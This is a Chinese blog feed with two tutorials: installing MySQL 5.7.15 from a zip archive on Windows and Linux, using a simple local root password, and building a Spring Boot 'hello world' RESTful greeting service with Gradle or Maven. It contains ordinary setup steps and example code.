<p>这里讲解的是mysql-5.7 window版本的安装，linux类似<br>首先上mysql官方网站下载mysql，下载地址：<a href="http://dev.mysql.com/downloads/mysql/" target="_blank" rel="noopener">http://dev.mysql.com/downloads/mysql/</a><br>我这里选择的是(mysql-5.7.15-winx64.zip)<br><a id="more"></a><br>下面开始进行安装：<br>1.首先解压mysql-5.7.15-winx64.zip到D盘根目录<br>2.重命名mysql-5.7.15-winx64为mysql-5.7.15<br>3.目录结构如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">│  COPYING</span><br><span class="line">│  my-default.ini</span><br><span class="line">│  README</span><br><span class="line">│</span><br><span class="line">├─bin</span><br><span class="line">│</span><br><span class="line">├─docs</span><br><span class="line">│      ChangeLog</span><br><span class="line">│      INFO_BIN</span><br><span class="line">│      INFO_SRC</span><br><span class="line">│</span><br><span class="line">├─include</span><br><span class="line">│  │</span><br><span class="line">│  └─mysql</span><br><span class="line">│      │</span><br><span class="line">│      └─psi</span><br><span class="line">│</span><br><span class="line">├─lib</span><br><span class="line">│  │</span><br><span class="line">│  ├─mecab</span><br><span class="line">│  │  ├─dic</span><br><span class="line">│  │  │  ├─ipadic_euc-jp</span><br><span class="line">│  │  │  │</span><br><span class="line">│  │  │  ├─ipadic_sjis</span><br><span class="line">│  │  │  │</span><br><span class="line">│  │  │  └─ipadic_utf-8</span><br><span class="line">│  │  │</span><br><span class="line">│  │  └─etc</span><br><span class="line">│  │          mecabrc</span><br><span class="line">│  │</span><br><span class="line">│  └─plugin</span><br><span class="line">│      │</span><br><span class="line">│      └─debug</span><br><span class="line">│</span><br><span class="line">└─share</span><br><span class="line">│</span><br><span class="line">├─bulgarian</span><br><span class="line">│</span><br><span class="line">├─charsets</span><br><span class="line">│</span><br><span class="line">├─czech</span><br><span class="line">│</span><br><span class="line">├─danish</span><br><span class="line">│</span><br><span class="line">├─dutch</span><br><span class="line">│</span><br><span class="line">├─english</span><br><span class="line">│</span><br><span class="line">├─estonian</span><br><span class="line">│</span><br><span class="line">├─french</span><br><span class="line">│</span><br><span class="line">├─german</span><br><span class="line">│      errmsg.sys</span><br><span class="line">│</span><br><span class="line">├─greek</span><br><span class="line">│</span><br><span class="line">├─hungarian</span><br><span class="line">│</span><br><span class="line">├─italian</span><br><span class="line">│</span><br><span class="line">├─japanese</span><br><span class="line">│</span><br><span class="line">├─korean</span><br><span class="line">│</span><br><span class="line">├─norwegian</span><br><span class="line">│</span><br><span class="line">├─norwegian-ny</span><br><span class="line">│</span><br><span class="line">├─polish</span><br><span class="line">│</span><br><span class="line">├─portuguese</span><br><span class="line">│</span><br><span class="line">├─romanian</span><br><span class="line">│</span><br><span class="line">├─russian</span><br><span class="line">│      errmsg.sys</span><br><span class="line">│</span><br><span class="line">├─serbian</span><br><span class="line">│</span><br><span class="line">├─slovak</span><br><span class="line">│</span><br><span class="line">├─spanish</span><br><span class="line">│</span><br><span class="line">├─swedish</span><br><span class="line">│</span><br><span class="line">└─ukrainian</span><br></pre></td></tr></table></figure></p>
<p>4.复制mysql-default.ini ====&gt; mysql-default.ini.bak<br>5.在d:\mysql-5.7.15下创建data目录<br>6.修改mysql-default.ini<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">innodb_buffer_pool_size = 128M</span><br><span class="line">basedir = D:/mysql-5.7.15</span><br><span class="line">datadir = ./data</span><br><span class="line">port = 3306</span><br><span class="line">server_id = mysqljoin_buffer_size = 128M</span><br><span class="line">sort_buffer_size = 2M</span><br><span class="line">read_rnd_buffer_size = 2M</span><br><span class="line">sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES</span><br></pre></td></tr></table></figure></p>
<p>7.打开cmd窗口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d:</span><br><span class="line">cd d:\mysql-5.7.15\bin</span><br><span class="line">mysqld --initialize-insecure</span><br></pre></td></tr></table></figure></p>
<p>8.再打开一个cmd窗口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">d:</span><br><span class="line">cd d:\mysql-5.7.15\bin</span><br><span class="line">mysql -uroot -p #回车两下</span><br><span class="line">mysql&gt;UPDATE mysql.user SET authentication_string=PASSWORD(&apos;root&apos;) WHERE User=&apos;root&apos;;</span><br><span class="line">mysql&gt;FLUSH PRIVILEGES;</span><br><span class="line">mysql&gt;quit;</span><br></pre></td></tr></table></figure></p>
<p>9.新建mysql-start.bat文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo off</span><br><span class="line">d:</span><br><span class="line">cd d:\mysql-5.7.15\bin</span><br><span class="line">mysqld</span><br></pre></td></tr></table></figure></p>
<p>10.把mysql-start.bat放入到开始-所有程序-启动目录下。这样就可以开机启动了（如有杀毒软件报，请允许）<br>linux安装请下载对应的linux压缩包 (mysql-5.7.15-linux-glibc2.5-x86_64.tar.gz)（未实践过）<br>比如说安装在/usr/local/目录下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#useradd mysql</span><br><span class="line">#su mysql</span><br><span class="line">先把mysql-5.7.15-linux-glibc2.5-x86_64.tar.gz上传至/usr/local目录下</span><br><span class="line">$cd /usr/local</span><br><span class="line">$tar -zxvf mysql-5.7.15-linux-glibc2.5-x86_64.tar.gz</span><br><span class="line">$mv mysql-5.7.15-linux-glibc2.5-x86_64 mysql-5.7.15</span><br><span class="line">$cd mysql-5.7.15</span><br><span class="line">$mkdir data</span><br><span class="line">$cp my-default.cnf my-default.cnf.bak</span><br><span class="line">$vi mysql-default.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">innodb_buffer_pool_size = 128M</span><br><span class="line">basedir = /usr/local/mysql-5.7.15</span><br><span class="line">datadir = ./data</span><br><span class="line">port = 3306</span><br><span class="line">server_id = mysql</span><br><span class="line">join_buffer_size = 128M</span><br><span class="line">sort_buffer_size = 2M</span><br><span class="line">read_rnd_buffer_size = 2M</span><br><span class="line">:wq</span><br><span class="line">$cd bin</span><br><span class="line">$mysqld --initialize-insecure</span><br><span class="line">#再打开一个命令行窗口</span><br><span class="line">$cd /usr/local/mysql-5.7.15/bin</span><br><span class="line">$mysql -uroot -p #回车两下</span><br><span class="line">mysql&gt;UPDATE mysql.user SET authentication_string=PASSWORD(&apos;root&apos;) WHERE User=&apos;root&apos;;</span><br><span class="line">mysql&gt;FLUSH PRIVILEGES;</span><br><span class="line">mysql&gt;quit;</span><br><span class="line">$su root</span><br><span class="line">#vi /etc/rc.d/rc.local</span><br><span class="line">#在最后添加</span><br><span class="line">su mysql -c &quot;/usr/local/mysql-5.7.15/bin/mysqld&quot;</span><br><span class="line">:wq</span><br><span class="line">#cd /usr/local/</span><br><span class="line">#chown -R mysql:mysql mysql-5.7.15</span><br><span class="line">#su mysql</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> mysql </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mysql-5.7.x </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[spring-boot 构建一个restful的web服务]]></title>
      <url>/2016/spring-boot-build-restful-web-service/</url>
      <content type="html"><![CDATA[<h2 id="构建一个restful的web服务"><a href="#构建一个restful的web服务" class="headerlink" title="构建一个restful的web服务"></a>构建一个restful的web服务</h2><p>这篇文章告诉你如何通过spring创建一个”hello world”的restful的web服务<br><a id="more"></a></p>
<h3 id="你会建立什么"><a href="#你会建立什么" class="headerlink" title="你会建立什么"></a>你会建立什么</h3><p>你会建立一个接受HTTP GET请求的服务：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/greeting</span><br></pre></td></tr></table></figure></p>
<p>问候语以JSON的形式响应：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;id&quot;:1,&quot;content&quot;:&quot;Hello, World!&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<p>你可以自定义问候语与一个可选 name 参数的查询字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/greeting?name=User</span><br></pre></td></tr></table></figure></p>
<p>这个name参数值覆盖默认的”World”，并反射到响应中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;id&quot;:1,&quot;content&quot;:&quot;Hello, User!&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="你需要什么"><a href="#你需要什么" class="headerlink" title="你需要什么"></a>你需要什么</h3><ul>
<li>15分钟时间</li>
<li>一个你喜欢的文本编辑器或者IDE（集成开发环境）</li>
<li><a href="http://www.oracle.com/technetwork/java/javase/downloads/index.html" target="_blank" rel="noopener">JDK 1.8</a>或以上版本</li>
<li><a href="http://www.gradle.org/downloads" target="_blank" rel="noopener">Gradle 2.3+</a> 或者 <a href="http://maven.apache.org/download.cgi" target="_blank" rel="noopener">Maven 3.0+</a></li>
<li>你也可以从本指南中导入代码，以及查看该网页直接进入<a href="http://spring.io/guides/gs/sts" target="_blank" rel="noopener">Spring Tool Suite(STS)</a>，并通过它来进行工作。</li>
</ul>
<h3 id="如何完成本指南"><a href="#如何完成本指南" class="headerlink" title="如何完成本指南"></a>如何完成本指南</h3><p>像大多数的 Spring <a href="http://spring.io/guides" target="_blank" rel="noopener">Getting Started guides</a>，你可以从头开始并完成每一个步骤，或者可以避开这个已经熟悉的基本设置步骤。无论以那种方式完成你的代码。</p>
<p>从头开始，请点击这里<a href="http://spring.io/guides/gs/rest-service/#scratch" target="_blank" rel="noopener">通过Gradle</a></p>
<p>跳过基础，进行如下操作：</p>
<ul>
<li>下载并解压源代码，或者使用git克隆它：<br><code>git clone https://github.com/spring-guides/gs-rest-service.git</code></li>
<li>进入 gs-rest-service/initial</li>
<li>直接跳到 创建资源类</li>
</ul>
<p>当你完成，你可以检查你的结果和代码在<br><code>gs-rest-service/complete</code></p>
<h3 id="通过Gradle构建"><a href="#通过Gradle构建" class="headerlink" title="通过Gradle构建"></a>通过Gradle构建</h3><p>首先你先建立一个基本的构建脚本，您可以使用spring在任何你喜欢的构建系统上构建app，但你的code需要用Gradle和Maven来运行。如果你不熟悉，要么，请参阅<a href="http://spring.io/guides/gs/gradle" target="_blank" rel="noopener">通过Gradle构建Java项目</a> 或者 <a href="http://spring.io/guides/gs/maven" target="_blank" rel="noopener">通过Maven构建Java项目</a></p>
<h4 id="创建目录结构"><a href="#创建目录结构" class="headerlink" title="创建目录结构"></a>创建目录结构</h4><p>在你选择的项目目录，创建如下的子目录结构，例子，在*nix系统通过 <code>mkdir -p src/main/java/hello</code>创建：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└── src  </span><br><span class="line">    └── main  </span><br><span class="line">        └── java  </span><br><span class="line">            └── hello</span><br></pre></td></tr></table></figure></p>
<h4 id="创建Gradle构建文件"><a href="#创建Gradle构建文件" class="headerlink" title="创建Gradle构建文件"></a>创建Gradle构建文件</h4><p>下面是<a href="https://github.com/spring-guides/gs-rest-service/blob/master/initial/build.gradle" target="_blank" rel="noopener">最初的构建文件</a></p>
<p>build.gradle<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">buildscript &#123;</span><br><span class="line">    repositories &#123;</span><br><span class="line">        mavenCentral()</span><br><span class="line">    &#125;</span><br><span class="line">    dependencies &#123;</span><br><span class="line">        classpath(&quot;org.springframework.boot:spring-boot-gradle-plugin:1.4.1.RELEASE&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">apply plugin: &apos;java&apos;</span><br><span class="line">apply plugin: &apos;eclipse&apos;</span><br><span class="line">apply plugin: &apos;idea&apos;</span><br><span class="line">apply plugin: &apos;spring-boot&apos;</span><br><span class="line"></span><br><span class="line">jar &#123;</span><br><span class="line">    baseName = &apos;gs-rest-service&apos;</span><br><span class="line">    version =  &apos;0.1.0&apos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">repositories &#123;</span><br><span class="line">    mavenCentral()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sourceCompatibility = 1.8</span><br><span class="line">targetCompatibility = 1.8</span><br><span class="line"></span><br><span class="line">dependencies &#123;</span><br><span class="line">    compile(&quot;org.springframework.boot:spring-boot-starter-web&quot;)</span><br><span class="line">    testCompile(&apos;org.springframework.boot:spring-boot-starter-test&apos;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这是<a href="https://github.com/spring-projects/spring-boot/tree/master/spring-boot-tools/spring-boot-gradle-plugin" target="_blank" rel="noopener">Spring Boot gradle plugin</a> 提供了许多快捷特性：</p>
<ul>
<li>它收集的类路径上所有jar文件，并建立一个单一的可运行的jar，这使得它更方便地执行和传输你的服务</li>
<li>它搜索 <code>public static void main()</code>方法来标示可运行的类</li>
<li>它提供了一个内置的依赖解析器，用于设置版本号以匹配<a href="https://github.com/spring-projects/spring-boot/blob/master/spring-boot-dependencies/pom.xml" target="_blank" rel="noopener">Spring Boot dependencies</a>。您可以覆盖任何你想要的版本，但它会默认引导的选择版本。</li>
</ul>
<h3 id="通过Maven构建"><a href="#通过Maven构建" class="headerlink" title="通过Maven构建"></a>通过Maven构建</h3><p>首先，你建立一个基本的构建脚本。你可以使用spring在任何你喜欢的构建系统上构建app，但是你的code必须通过Maven来运行，如果你还不熟悉Maven，请参阅<a href="http://spring.io/guides/gs/maven" target="_blank" rel="noopener">Building Java Projects with Maven</a></p>
<h4 id="创建目录结构-1"><a href="#创建目录结构-1" class="headerlink" title="创建目录结构"></a>创建目录结构</h4><p>在你选择的项目目录，创建如下子目录结构；例子，在 *nix 系统通过<code>mkdir -p src/main/java/hello</code> 创建：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└── src</span><br><span class="line">    └── main</span><br><span class="line">        └── java</span><br><span class="line">            └── hello</span><br></pre></td></tr></table></figure></p>
<p>pom.xml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">    xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;gs-rest-service&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;0.1.0&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;parent&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.4.1.RELEASE&lt;/version&gt;</span><br><span class="line">    &lt;/parent&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class="line">            &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.jayway.jsonpath&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;json-path&lt;/artifactId&gt;</span><br><span class="line">            &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;java.version&gt;1.8&lt;/java.version&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line"></span><br><span class="line">    &lt;repositories&gt;</span><br><span class="line">        &lt;repository&gt;</span><br><span class="line">            &lt;id&gt;spring-releases&lt;/id&gt;</span><br><span class="line">            &lt;url&gt;https://repo.spring.io/libs-release&lt;/url&gt;</span><br><span class="line">        &lt;/repository&gt;</span><br><span class="line">    &lt;/repositories&gt;</span><br><span class="line">    &lt;pluginRepositories&gt;</span><br><span class="line">        &lt;pluginRepository&gt;</span><br><span class="line">            &lt;id&gt;spring-releases&lt;/id&gt;</span><br><span class="line">            &lt;url&gt;https://repo.spring.io/libs-release&lt;/url&gt;</span><br><span class="line">        &lt;/pluginRepository&gt;</span><br><span class="line">    &lt;/pluginRepositories&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>
<p>这是<a href="https://github.com/spring-projects/spring-boot/tree/master/spring-boot-tools/spring-boot-maven-plugin" target="_blank" rel="noopener">Spring Boot Maven plugin</a>/提供许多快捷特性：</p>
<ul>
<li>它收集的类路径上所有jar文件，并建立一个单一的可运行的jar，这使得它更方便地执行和传输你的服务</li>
<li>它搜索 <code>public static void main()</code>方法来标示可运行的类</li>
<li>它提供了一个内置的依赖解析器，用于设置版本号以匹配<a href="https://github.com/spring-projects/spring-boot/blob/master/spring-boot-dependencies/pom.xml" target="_blank" rel="noopener">Spring Boot dependencies</a>。您可以覆盖任何你想要的版本，但它会默认引导的选择版本。</li>
</ul>
<h3 id="通过IDE构建"><a href="#通过IDE构建" class="headerlink" title="通过IDE构建"></a>通过IDE构建</h3><ul>
<li>如何阅读本指南直接导入到<a href="http://spring.io/guides/gs/sts/" target="_blank" rel="noopener">Spring Tool Suite</a></li>
<li>了解如何使用本指南运行在<a href="http://spring.io/guides/gs/intellij-idea" target="_blank" rel="noopener">IntelliJ IDEA</a>中</li>
</ul>
<h4 id="创建资源类"><a href="#创建资源类" class="headerlink" title="创建资源类"></a>创建资源类</h4><p>现在你已经设置了该项目，并构建系统，你可以创建Web服务。</p>
<p>通过考虑服务交互开始流程。</p>
<p>这个服务将处理<code>GET</code>请求<code>/greeting</code>，通过可选<code>name</code>参数查询字符串，<code>GET</code>请求应返回一个200 OK的响应JSON字符串，字符串应该是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;id&quot;: 1,</span><br><span class="line">    &quot;content&quot;: &quot;Hello, World!&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>id</code>字段是用于问候的唯一标识<br><code>content</code>是问候的文字描述</p>
<p>问候转换成model表示，你可以创建一个资源类，通过一些<code>id</code>,<code>content</code>字段，构造方法和getter方法提供一个简单的java对象：<br><code>src/main/java/hello/Greeting.java</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package hello;</span><br><span class="line"></span><br><span class="line">public class Greeting &#123;</span><br><span class="line"></span><br><span class="line">    private final long id;</span><br><span class="line">    private final String content;</span><br><span class="line"></span><br><span class="line">    public Greeting(long id, String content) &#123;</span><br><span class="line">        this.id = id;</span><br><span class="line">        this.content = content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public long getId() &#123;</span><br><span class="line">        return id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getContent() &#123;</span><br><span class="line">        return content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>spring 默认使用的是 Jackson JSON库自动封装<code>Greeting</code>为JSON</p>
</blockquote>
<p>接下来创建资源控制器</p>
<h4 id="创建资源控制器"><a href="#创建资源控制器" class="headerlink" title="创建资源控制器"></a>创建资源控制器</h4><p>在Spring的方式来构建RESTful Web服务，HTTP请求由控制器处理。通过<code>@RestController</code>注解标识的<code>GreetingController</code>下处理<code>GET</code>请求<code>/greeting</code>返回一个实例<code>Greeting</code>：</p>
<p><code>src/main/java/hello/GreetingController.java</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package hello;</span><br><span class="line"></span><br><span class="line">import java.util.concurrent.atomic.AtomicLong;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line">import org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line">@RestController</span><br><span class="line">public class GreetingController &#123;</span><br><span class="line"></span><br><span class="line">    private static final String template = &quot;Hello, %s!&quot;;</span><br><span class="line">    private final AtomicLong counter = new AtomicLong();</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;/greeting&quot;)</span><br><span class="line">    public Greeting greeting(@RequestParam(value=&quot;name&quot;, defaultValue=&quot;World&quot;) String name) &#123;</span><br><span class="line">        return new Greeting(counter.incrementAndGet(),</span><br><span class="line">                            String.format(template, name));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个控制器看似简单，但隐藏了很多细节，让我们一步一步揭开这些细节。</p>
<p><code>@RequestMapping</code>注解确保http请求<code>/greeting</code>映射到<code>greeting()</code>方法上。</p>
<blockquote>
<p>上面的例子并不指定<code>GET</code>与<code>PUT</code>，<code>POST</code>，等等，因为<code>@RequestMapping</code>在默认情况下映射的所有HTTP操作。使用<code>@RequestMapping(method=GET)</code>来缩小这种映射范围</p>
</blockquote>
<p><code>@RequestParam</code>绑定查询字符串<code>name</code>的值到<code>greeting()</code>方法<code>的name</code>参数上，这个查询字符串明确声明为可选(默认<code>required=true</code>)，如果在请求参数中缺少，则使用默认值”World”。</p>
<p>这个方法体实现是通过<code>id</code>和<code>content</code>属性创建一个<code>Greeting</code>对象返回，<code>id</code>是通过计数器，<code>name</code>是通过格式话模板字符串。</p>
<p>传统的MVC控制器和上面的RESTful Web服务控制器之间的主要区别在于HTTP响应体的创建方式。而不是依靠一个视图技术来执行服务器端渲染的HTML问候数据，这RESTful Web服务控制器简单地填充，并返回一个<code>Greeting</code>对象，对象数据将直接通过JSON格式写入到HTTP响应中。</p>
